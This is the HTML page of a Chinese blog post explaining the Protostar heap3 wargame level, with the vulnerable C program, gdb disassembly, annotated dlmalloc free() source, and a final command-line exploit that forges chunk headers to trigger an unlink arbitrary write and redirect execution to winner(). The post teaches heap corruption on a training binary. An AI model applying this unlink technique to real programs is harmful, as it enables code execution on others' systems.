@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法 | mrh的学习分享</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1 源码1234567891011121314151617181920212223242526272829#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;void winner()&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">
+<meta property="og:url" content="http://yoursite.com/2015/12/14/protostar-heap3/index.html">
+<meta property="og:site_name" content="mrh的学习分享">
+<meta property="og:description" content="1 源码1234567891011121314151617181920212223242526272829#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;void winner()&amp;#123;">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_bins.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_heapstat.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_free_alg.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_normal.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_exploit.png">
+<meta property="og:updated_time" content="2016-03-24T03:38:34.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">
+<meta name="twitter:description" content="1 源码1234567891011121314151617181920212223242526272829#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;void winner()&amp;#123;">
+  
+    <link rel="alternative" href="/atom.xml" title="mrh的学习分享" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/touxiang.jpeg">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/">mrh</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">胸口写一个勇字</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
+                        
+                            <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
+                        
+                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/turingH" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
+                            
+                                <a class="fl facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CVE/" style="font-size: 13.33px;">CVE</a> <a href="/tags/DWORDSHOOT/" style="font-size: 10px;">DWORDSHOOT</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/OSX/" style="font-size: 11.67px;">OSX</a> <a href="/tags/bounds-checking/" style="font-size: 10px;">bounds checking</a> <a href="/tags/dlopen/" style="font-size: 10px;">dlopen</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/dos/" style="font-size: 10px;">dos</a> <a href="/tags/dyld/" style="font-size: 15px;">dyld</a> <a href="/tags/dynamic-link/" style="font-size: 10px;">dynamic link</a> <a href="/tags/execv/" style="font-size: 11.67px;">execv</a> <a href="/tags/execve/" style="font-size: 10px;">execve</a> <a href="/tags/exploit/" style="font-size: 20px;">exploit</a> <a href="/tags/frame-faking/" style="font-size: 10px;">frame-faking</a> <a href="/tags/free/" style="font-size: 10px;">free</a> <a href="/tags/freebsd/" style="font-size: 10px;">freebsd</a> <a href="/tags/gethostbyname/" style="font-size: 10px;">gethostbyname</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/heap/" style="font-size: 16.67px;">heap</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/kernel/" style="font-size: 15px;">kernel</a> <a href="/tags/kextload/" style="font-size: 10px;">kextload</a> <a href="/tags/level02/" style="font-size: 10px;">level02</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mach-o/" style="font-size: 18.33px;">mach-o</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/osx/" style="font-size: 16.67px;">osx</a> <a href="/tags/patch/" style="font-size: 10px;">patch</a> <a href="/tags/ports/" style="font-size: 11.67px;">ports</a> <a href="/tags/race/" style="font-size: 11.67px;">race</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/stack/" style="font-size: 13.33px;">stack</a> <a href="/tags/stackoverflow/" style="font-size: 10px;">stackoverflow</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a> <a href="/tags/wargame/" style="font-size: 11.67px;">wargame</a>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">啥也不说了，先干黄旭东</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">mrh</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">mrh</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">胸口写一个勇字</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
+                
+                    <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
+                
+                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/turingH" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
+                    
+                        <a class="facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-protostar-heap3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/12/14/protostar-heap3/" class="article-date">
+      <time datetime="2015-12-14T20:57:02.000Z" itemprop="datePublished">2015-12-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/protostar/">protostar</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exploit/">exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/free/">free</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unlink/">unlink</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="1_源码">1 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h1 id="2_基础知识">2 基础知识</h1><p>​    1.DWORDSHOOT</p>
+<p>​        需要了解DWORDSHOOT基本原理，heap3最后是使用了free时触发unlink来实现任意地址修        改，实现控制程序执行流程的。DWORDSHOOT的原理，再另外一篇文章中已经有比较详细的介绍了。</p>
+<p>​        <a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a></p>
+<p>​    2.DLMALLOC</p>
+<p>​        了解malloc库的基本原理，从而明白如何通过free来触发unlink从而完成溢出。</p>
+<p>​        <a href="https://github.com/turingH/exploit/blob/master/dlmalloc/malloc.c" target="_blank" rel="external">malloc.c[翻译中]</a>空闲时间会持续翻译。</p>
+<p>​        <a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">dlmalloc</a>作者自己写的文章。其中与我们特别相关的是free算法于bins。这里先简单介绍一下bins。</p>
+<p>​        <img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_bins.png" alt="bins结构图"></p>
+<h1 id="3_调试">3 调试</h1><p>​    使用gdb查看汇编代码。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb$ disas main&#10;Dump of assembler code for function main:&#10;0x08048889 &#60;main+0&#62;:&#9;push   ebp&#10;0x0804888a &#60;main+1&#62;:&#9;mov    ebp,esp&#10;0x0804888c &#60;main+3&#62;:&#9;and    esp,0xfffffff0&#10;0x0804888f &#60;main+6&#62;:&#9;sub    esp,0x20&#10;0x08048892 &#60;main+9&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x08048899 &#60;main+16&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x0804889e &#60;main+21&#62;:&#9;mov    DWORD PTR [esp+0x14],eax&#10;0x080488a2 &#60;main+25&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x080488a9 &#60;main+32&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x080488ae &#60;main+37&#62;:&#9;mov    DWORD PTR [esp+0x18],eax&#10;0x080488b2 &#60;main+41&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x080488b9 &#60;main+48&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x080488be &#60;main+53&#62;:&#9;mov    DWORD PTR [esp+0x1c],eax&#10;0x080488c2 &#60;main+57&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488c5 &#60;main+60&#62;:&#9;add    eax,0x4&#10;0x080488c8 &#60;main+63&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488ca &#60;main+65&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488ce &#60;main+69&#62;:&#9;mov    eax,DWORD PTR [esp+0x14]&#10;0x080488d2 &#60;main+73&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x080488d5 &#60;main+76&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x080488da &#60;main+81&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488dd &#60;main+84&#62;:&#9;add    eax,0x8&#10;0x080488e0 &#60;main+87&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488e2 &#60;main+89&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488e6 &#60;main+93&#62;:&#9;mov    eax,DWORD PTR [esp+0x18]&#10;0x080488ea &#60;main+97&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x080488ed &#60;main+100&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x080488f2 &#60;main+105&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488f5 &#60;main+108&#62;:&#9;add    eax,0xc&#10;0x080488f8 &#60;main+111&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488fa &#60;main+113&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488fe &#60;main+117&#62;:&#9;mov    eax,DWORD PTR [esp+0x1c]&#10;0x08048902 &#60;main+121&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048905 &#60;main+124&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x0804890a &#60;main+129&#62;:&#9;mov    eax,DWORD PTR [esp+0x1c]&#10;0x0804890e &#60;main+133&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048911 &#60;main+136&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x08048916 &#60;main+141&#62;:&#9;mov    eax,DWORD PTR [esp+0x18]&#10;0x0804891a &#60;main+145&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x0804891d &#60;main+148&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x08048922 &#60;main+153&#62;:&#9;mov    eax,DWORD PTR [esp+0x14]&#10;0x08048926 &#60;main+157&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048929 &#60;main+160&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x0804892e &#60;main+165&#62;:&#9;mov    DWORD PTR [esp],0x804ac27&#10;0x08048935 &#60;main+172&#62;:&#9;call   0x8048790 &#60;puts@plt&#62;&#10;0x0804893a &#60;main+177&#62;:&#9;leave  &#10;0x0804893b &#60;main+178&#62;:&#9;ret</span><br></pre></td></tr></table></figure>
+<p>在第一个free和ret之前分别下断点，观察堆上数据。具体如下图所示：</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_heapstat.png" alt="Image text"></p>
+<p>现在我们去分析<a href="https://github.com/turingH/exploit/blob/master/dlmalloc/malloc.c" target="_blank" rel="external">malloc.c</a>源码的free部分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dlfree</span><span class="params">(<span class="keyword">void</span>* mem)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*</span><br><span class="line">     Consolidate freed chunks with preceeding or succeeding bordering</span><br><span class="line">     free chunks, if they exist, and then place in a bin.  Intermixed</span><br><span class="line">     with special cases for top, dv, mmapped chunks, and usage errors.</span><br><span class="line">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem != <span class="number">0</span>) &#123;</span><br><span class="line">    mchunkptr p  = mem2chunk(mem); <span class="comment">//将user使用的内存地址转化为chunk所指向的地址。</span></span><br><span class="line">	</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> FOOTERS</span></span><br><span class="line">    mstate fm = get_mstate_for(p);</span><br><span class="line">    <span class="keyword">if</span> (!ok_magic(fm)) &#123;</span><br><span class="line">      USAGE_ERROR_ACTION(fm, p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span> <span class="comment">/* FOOTERS */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> fm gm</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* FOOTERS */</span></span></span><br><span class="line">    <span class="keyword">if</span> (!PREACTION(fm)) &#123;</span><br><span class="line">      </span><br><span class="line">	  check_inuse_chunk(fm, p);	</span><br><span class="line">	  <span class="comment">//所有相关字段的检测，与主题逻辑无关。</span></span><br><span class="line">      </span><br><span class="line">	  <span class="keyword">if</span> (RTCHECK(ok_address(fm, p) &amp;&amp; ok_inuse(p))) &#123; </span><br><span class="line">		<span class="comment">//检测地址与内存使用状态是否合法。</span></span><br><span class="line">        </span><br><span class="line">		<span class="keyword">size_t</span> psize = chunksize(p);</span><br><span class="line">		<span class="comment">//通过p-&gt;head计算chunk的长度。</span></span><br><span class="line">		</span><br><span class="line">        mchunkptr next = chunk_plus_offset(p, psize);</span><br><span class="line">		<span class="comment">//通过p指针与求得的size计算nextchunk。</span></span><br><span class="line">       </span><br><span class="line">		<span class="keyword">if</span> (!pinuse(p)) &#123;</span><br><span class="line">			<span class="comment">//如果内存块正没有被使用。</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">size_t</span> prevsize = p-&gt;prev_foot;</span><br><span class="line">		  <span class="comment">// 获取前一个chunk块的长度。</span></span><br><span class="line"></span><br><span class="line">		  <span class="comment">/*这一段是mapped可不看--------start-------*/</span></span><br><span class="line">          <span class="keyword">if</span> (is_mmapped(p)) &#123;</span><br><span class="line">            psize += prevsize + MMAP_FOOT_PAD;</span><br><span class="line">            <span class="keyword">if</span> (CALL_MUNMAP((<span class="keyword">char</span>*)p - prevsize, psize) == <span class="number">0</span>)</span><br><span class="line">              fm-&gt;footprint -= psize;</span><br><span class="line">            <span class="keyword">goto</span> postaction;</span><br><span class="line">          &#125;</span><br><span class="line">		  <span class="comment">/*这一段是mapped可不看--------end-------*/</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">			  <span class="comment">//内存快不是mapped分配的</span></span><br><span class="line">            mchunkptr prev = chunk_minus_offset(p, prevsize);</span><br><span class="line">			<span class="comment">//chunk指针减去前一个chunk的长度获得前一个chunk的开始地址</span></span><br><span class="line">            psize += prevsize;</span><br><span class="line">            p = prev;</span><br><span class="line">			<span class="comment">//重新计算chunk长度，将指针指向前一个chunk开始的地方。</span></span><br><span class="line">            <span class="keyword">if</span> (RTCHECK(ok_address(fm, prev))) &#123; <span class="comment">/* consolidate backward */</span></span><br><span class="line">              <span class="keyword">if</span> (p != fm-&gt;dv) &#123;</span><br><span class="line">				  <span class="comment">//核心关键，进入了unlink流程。将修改后的p从双向链表中unlink下来。</span></span><br><span class="line">                unlink_chunk(fm, p, prevsize);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> ((next-&gt;head &amp; INUSE_BITS) == INUSE_BITS) &#123;</span><br><span class="line">                fm-&gt;dvsize = psize;</span><br><span class="line">                set_free_with_pinuse(p, psize, next);</span><br><span class="line">                <span class="keyword">goto</span> postaction;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              <span class="keyword">goto</span> erroraction;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据源码，简单的流程如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_free_alg.png" alt="free简易流程图"></p>
+<p>那么正常情况下free(c)代码执行时，对流程的分析如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_normal.png" alt="正常情况下的free(c)"></p>
+<p>而在对输入的参数精心构筑之后溢出后的流程分析如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_exploit.png" alt="溢出后的free(c)"></p>
+<p>所以此题的答案也就出来了。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/tmp$ ./bin/heap3 `python -c "print '\x90'*10 + '\x68\x64\x88\x04\x08\xc3'"` `python -c "print 'A'*32 + '\xfc\xff\xff\xff'*2 + 'CCCC' + '\x1c\xb1\x04\x08' + '\x04\xc0\x04\x08' "` F</span><br><span class="line">that wasn't too bad now, was it? @ 1449484612</span><br></pre></td></tr></table></figure>
+<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">这里</a>。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 mrh 的个人博客">mrh</a></p>
+        <p><span>发布时间:</span>2015年12月14日 - 15时57分</p>
+        <p><span>最后更新:</span>2016年03月23日 - 23时38分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2015/12/14/protostar-heap3/" title="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">http://yoursite.com/2015/12/14/protostar-heap3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2015/12/14/protostar-heap3/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2016/01/27/frame-faking/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          frame-faking-介绍-函数调用伪造
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/12/12/图解DWORDSHOOT/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">图解DWORDSHOOT</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1_源码"><span class="toc-number">1.</span> <span class="toc-text">1 源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2_基础知识"><span class="toc-number">2.</span> <span class="toc-text">2 基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3_调试"><span class="toc-number">3.</span> <span class="toc-text">3 调试</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
